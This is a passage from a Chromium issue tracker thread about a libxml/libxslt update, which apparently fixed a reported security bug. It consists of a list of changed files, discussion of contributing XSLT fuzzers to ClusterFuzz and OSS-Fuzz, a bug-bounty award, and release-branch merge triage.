[modify] https://crrev.com/ee86799b2b90cd65e31a42e65fef44c58691285d/third_party/libxml/src/libxml2.spec
[modify] https://crrev.com/ee86799b2b90cd65e31a42e65fef44c58691285d/third_party/libxml/src/parser.c
[modify] https://crrev.com/ee86799b2b90cd65e31a42e65fef44c58691285d/third_party/libxml/src/parserInternals.c
[modify] https://crrev.com/ee86799b2b90cd65e31a42e65fef44c58691285d/third_party/libxml/src/runsuite.c
[modify] https://crrev.com/ee86799b2b90cd65e31a42e65fef44c58691285d/third_party/libxml/src/runtest.c
[modify] https://crrev.com/ee86799b2b90cd65e31a42e65fef44c58691285d/third_party/libxml/src/testC14N.c
[modify] https://crrev.com/ee86799b2b90cd65e31a42e65fef44c58691285d/third_party/libxml/src/testRelax.c
[modify] https://crrev.com/ee86799b2b90cd65e31a42e65fef44c58691285d/third_party/libxml/src/testSchemas.c
[modify] https://crrev.com/ee86799b2b90cd65e31a42e65fef44c58691285d/third_party/libxml/src/testThreads.c
[delete] https://crrev.com/f18269bd528b1d5ecee3aee4a9e56b7c13e448c4/third_party/libxml/src/testThreadsWin32.c
[modify] https://crrev.com/ee86799b2b90cd65e31a42e65fef44c58691285d/third_party/libxml/src/testURI.c
[modify] https://crrev.com/ee86799b2b90cd65e31a42e65fef44c58691285d/third_party/libxml/src/testapi.c
[modify] https://crrev.com/ee86799b2b90cd65e31a42e65fef44c58691285d/third_party/libxml/src/testrecurse.c
[modify] https://crrev.com/ee86799b2b90cd65e31a42e65fef44c58691285d/third_party/libxml/src/uri.c
[modify] https://crrev.com/ee86799b2b90cd65e31a42e65fef44c58691285d/third_party/libxml/src/win32/Makefile.bcb
[modify] https://crrev.com/ee86799b2b90cd65e31a42e65fef44c58691285d/third_party/libxml/src/win32/Makefile.mingw
[modify] https://crrev.com/ee86799b2b90cd65e31a42e65fef44c58691285d/third_party/libxml/src/win32/Makefile.msvc
[modify] https://crrev.com/ee86799b2b90cd65e31a42e65fef44c58691285d/third_party/libxml/src/xmlreader.c
[modify] https://crrev.com/ee86799b2b90cd65e31a42e65fef44c58691285d/third_party/libxml/src/xmlsave.c
[modify] https://crrev.com/ee86799b2b90cd65e31a42e65fef44c58691285d/third_party/libxml/src/xpath.c
[modify] https://crrev.com/ee86799b2b90cd65e31a42e65fef44c58691285d/third_party/libxml/win32/include/libxml/xmlversion.h
[modify] https://crrev.com/ee86799b2b90cd65e31a42e65fef44c58691285d/third_party/libxslt/README.chromium
[modify] https://crrev.com/ee86799b2b90cd65e31a42e65fef44c58691285d/third_party/libxslt/chromium/roll.py
[modify] https://crrev.com/ee86799b2b90cd65e31a42e65fef44c58691285d/third_party/libxslt/linux/config.h
[modify] https://crrev.com/ee86799b2b90cd65e31a42e65fef44c58691285d/third_party/libxslt/linux/libexslt/exsltconfig.h
[modify] https://crrev.com/ee86799b2b90cd65e31a42e65fef44c58691285d/third_party/libxslt/linux/libxslt/xsltwin32config.h
[modify] https://crrev.com/ee86799b2b90cd65e31a42e65fef44c58691285d/third_party/libxslt/mac/config.h
[modify] https://crrev.com/ee86799b2b90cd65e31a42e65fef44c58691285d/third_party/libxslt/src/config.h.in
[modify] https://crrev.com/ee86799b2b90cd65e31a42e65fef44c58691285d/third_party/libxslt/src/configure.ac
[modify] https://crrev.com/ee86799b2b90cd65e31a42e65fef44c58691285d/third_party/libxslt/src/libexslt/Makefile.am
[modify] https://crrev.com/ee86799b2b90cd65e31a42e65fef44c58691285d/third_party/libxslt/src/libexslt/exsltexports.h
[modify] https://crrev.com/ee86799b2b90cd65e31a42e65fef44c58691285d/third_party/libxslt/src/libexslt/functions.c
[modify] https://crrev.com/ee86799b2b90cd65e31a42e65fef44c58691285d/third_party/libxslt/src/libxslt.spec
[modify] https://crrev.com/ee86799b2b90cd65e31a42e65fef44c58691285d/third_party/libxslt/src/libxslt/Makefile.am
[modify] https://crrev.com/ee86799b2b90cd65e31a42e65fef44c58691285d/third_party/libxslt/src/libxslt/numbers.c
[modify] https://crrev.com/ee86799b2b90cd65e31a42e65fef44c58691285d/third_party/libxslt/src/libxslt/pattern.c
[modify] https://crrev.com/ee86799b2b90cd65e31a42e65fef44c58691285d/third_party/libxslt/src/libxslt/security.c
[modify] https://crrev.com/ee86799b2b90cd65e31a42e65fef44c58691285d/third_party/libxslt/src/libxslt/templates.c
[modify] https://crrev.com/ee86799b2b90cd65e31a42e65fef44c58691285d/third_party/libxslt/src/libxslt/transform.c
[modify] https://crrev.com/ee86799b2b90cd65e31a42e65fef44c58691285d/third_party/libxslt/src/libxslt/variables.c
[modify] https://crrev.com/ee86799b2b90cd65e31a42e65fef44c58691285d/third_party/libxslt/src/libxslt/variables.h
[modify] https://crrev.com/ee86799b2b90cd65e31a42e65fef44c58691285d/third_party/libxslt/src/libxslt/xsltconfig.h
[modify] https://crrev.com/ee86799b2b90cd65e31a42e65fef44c58691285d/third_party/libxslt/src/libxslt/xsltexports.h
[modify] https://crrev.com/ee86799b2b90cd65e31a42e65fef44c58691285d/third_party/libxslt/src/win32/Makefile.mingw
[modify] https://crrev.com/ee86799b2b90cd65e31a42e65fef44c58691285d/third_party/libxslt/src/win32/Makefile.msvc
[modify] https://crrev.com/ee86799b2b90cd65e31a42e65fef44c58691285d/third_party/libxslt/src/win32/libxslt/libxslt.def
[modify] https://crrev.com/ee86799b2b90cd65e31a42e65fef44c58691285d/third_party/libxslt/src/win32/libxslt/libxslt.dsw
[modify] https://crrev.com/ee86799b2b90cd65e31a42e65fef44c58691285d/third_party/libxslt/src/win32/libxslt/libxslt_so.dsp
[modify] https://crrev.com/ee86799b2b90cd65e31a42e65fef44c58691285d/third_party/libxslt/src/win32/libxslt/xsltproc.dsp


### sc...@chromium.org (2019-02-22)

Huge thanks to Nick and the original reporter.

### sh...@chromium.org (2019-02-22)

[Empty comment from Monorail migration]

### na...@google.com (2019-02-25)

[Empty comment from Monorail migration]

### mm...@chromium.org (2019-02-26)

Nicolas, you're fuzzing XSLT, aren't you? Have you heard of https://www.google.com/about/appsecurity/chrome-rewards/#fuzzerprogram ?

TL;DR is that we can run your fuzzer on ClusterFuzz, you'll get access to all the findings (properly deduplicated, etc) and get the same rewards for the valid security issues + $500 bonus on top of each of those.

### ni...@gmail.com (2019-02-26)

ClusterFuzz looks interesting, but there's a few points which aren't clear to me. For example, I use custom targets (AFL-optimized xsltproc, libFuzzer fuzz targets) and fuzzers (currently AFL + XML-aware mutators, should be ported to libFuzzer). How would that integrate with your fuzzing program? 

By the way: Nick, would you be interested in collaborating with me on libxslt integration to OSS Fuzz?
Detaisl at https://github.com/google/oss-fuzz/blob/master/docs/ideal_integration.md

Note: I noticed OSS Fuzz / *Magick projects don't have any libFuzzer target for SVG. That's another point I'd like to cover (my fuzzer recently found bugs in *Magick too).

### mm...@chromium.org (2019-02-26)

> ClusterFuzz looks interesting, but there's a few points which aren't clear to me. For example, I use custom targets (AFL-optimized xsltproc, libFuzzer fuzz targets) and fuzzers (currently AFL + XML-aware mutators, should be ported to libFuzzer). How would that integrate with your fuzzing program? 


libFuzzer fuzz targets are the best fit. These just need to be landed in Chromium, and we'll mark in CF config that particular fuzz targets are contributed by a particular external researcher, so you'll get CC'd on bug reports, get access to ClusterFuzz interface, and we'll know that we need to reward you when a valid security issue is found.

Docs: https://chromium.googlesource.com/chromium/src/+/master/testing/libfuzzer/getting_started.md#write-fuzz-target

Example: https://cs.chromium.org/search/?q=libxml_xml_read_memory_fuzzer+file:%5Esrc/testing/libfuzzer/fuzzers/+package:%5Echromium$&type=cs

As for the more custom approaches, we usually could upload those too, the concept is that you need to have a "generator" that produces new testcases (could be a mutator, not necessary generator) and a target application (which appears to be `chrome` in this case). I don't think though that this is a good idea to invoke the whole chrome binary for testing XSLT files. If you could supply your mutators as a custom mutator for libFuzzer (http://llvm.org/docs/LibFuzzer.html#user-supplied-mutators), that would be the best and likely the most efficient.

And +500 to OSS-Fuzz integration!

### we...@aevum.de (2019-02-28)

I wrote a few fuzz targets for libxslt in 2016 and always wanted to integrate with OSS-Fuzz at some point. Then I concluded it would make more sense to start with libxml2 first. Some of the features I was working on:

- Support multiple input files, for example external entities, external DTDs, XSLT imports/includes.
- Use the existing tests as corpus.
- Limit execution of XPath operations, the primary source of timeouts.

Most of my work is in a semi-completed state and at some point I simply ran out of motivation. My involvement in libxml2/libxslt is essentially unpaid and the couple of $$$ I make with bug bounties all go back into maintenance. I recently applied for a grant at a major OSS foundation to finish my work on libxml2 fuzz targets but I still have to hear back from them. I prefer a grant with a well-defined scope and payout over Google's reward programs but I'm open to all kinds of funding.

### ni...@gmail.com (2019-02-28)

Integration to OSS Fuzz is rewarded, see https://opensource.googleblog.com/2017/05/oss-fuzz-five-months-later-and.html

### na...@google.com (2019-02-28)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
*********************************

### na...@google.com (2019-02-28)

Congrats! The Panel decided to reward $1,000 for this report :) 

### mm...@chromium.org (2019-02-28)

wellnhofer@, that's a totally reasonable point! Thanks Nicolas for posting the link in c#25, we do reward OSS-Fuzz integrations.

### ni...@gmail.com (2019-02-28)

Thanks for the reward!

### aw...@google.com (2019-03-04)

[Empty comment from Monorail migration]

### aw...@google.com (2019-03-04)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-03-23)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-03-23)

This bug requires manual review: M74 has already been promoted to the beta branch, so this requires manual review
Please contact the milestone owner if you have questions.
Owners: govind@(Android), kariahda@(iOS), dgagnon@(ChromeOS), abdulsyed@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### go...@chromium.org (2019-03-23)

[Comment Deleted]

### go...@chromium.org (2019-03-23)

[Comment Deleted]

### go...@chromium.org (2019-03-23)

adetaylor@ & awhalley@, not sure why sheriffbot is requesting merge for this. We saw similar issue with previous milestones too.



CL listed at #17 landed way before M74 branch #3729 on March 7th at chromium revision 638880.

### ad...@chromium.org (2019-03-26)

There is nothing that needs merging here.

### aw...@google.com (2019-04-17)

[Empty comment from Monorail migration]

### aw...@chromium.org (2019-04-22)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-06-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ad...@google.com (2019-12-11)

[Empty comment from Monorail migration]

### oc...@google.com (2019-12-16)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-08)

This issue was migrated from crbug.com/chromium/930663?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail mergedwith: crbug.com/chromium/1034222]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40094011)*
